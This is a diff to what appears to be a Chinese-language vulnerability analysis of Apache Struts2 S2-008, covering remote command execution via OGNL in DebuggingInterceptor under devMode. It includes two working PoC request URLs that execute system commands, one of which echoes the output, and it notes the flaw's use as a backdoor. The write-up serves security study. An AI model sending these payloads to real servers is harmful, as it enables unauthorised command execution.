@@ -493,14 +493,37 @@ https://cwiki.apache.org/confluence/display/WW/S2-008
 
 ### vuln-2：Remote command execution in DebuggingInterceptor
 
-该漏洞的前提条件
+该漏洞的前提条件是需要应用开启`devMode`模式。
 
+<img src="pic/struts2_s2-008_6.png">
+
+正如[vulhub](https://github.com/vulhub/vulhub/blob/master/struts2/s2-008/README.zh-cn.md)上面提到的一样，该漏洞虽然较为鸡肋，但也可用作后门：
+>在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。
+
+漏洞原理比较简单，因为代码显而易见，在`DebuggingInterceptor#intercept()`中对入参进行了OGNL表达式计算，如下图：
+
+<img src="pic/struts2_s2-008_7.png">
+
+可简单执行命令的PoC如下：
+```
+/devmode.action?debug=command
+&expression=(%23_memberAccess.allowStaticMethodAccess=true,@java.lang.Runtime@getRuntime().exec('touch%20/tmp/success2'))
+```
 
 ### vuln-2：可回显PoC
 
+因为`DebuggingInterceptor`会把表达式的计算结果返回，所以这里就没有必要获取`response`对象了：
 
+```
+/devmode.action?debug=command
+&expression=(%23_memberAccess.allowStaticMethodAccess=true,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23br=new%20java.io.BufferedReader(new%20java.io.InputStreamReader(%23ret.getInputStream())),%23res=new%20char[20000],%23br.read(%23res),new%20java.lang.String(%23res))
+```
+
+<img src="pic/struts2_s2-008_8.png">
 
 ## 漏洞修复
+
+后续的版本中，并没有对拦截器`DebuggingInterceptor`中的代码进行修复，因为就该调试功能本身而言，并不是漏洞。所以后续的修复主要是针对`SecurityMemberAccess`的代码进行改进，增强安全性。
 
 
 <a name="s2-009"></a>
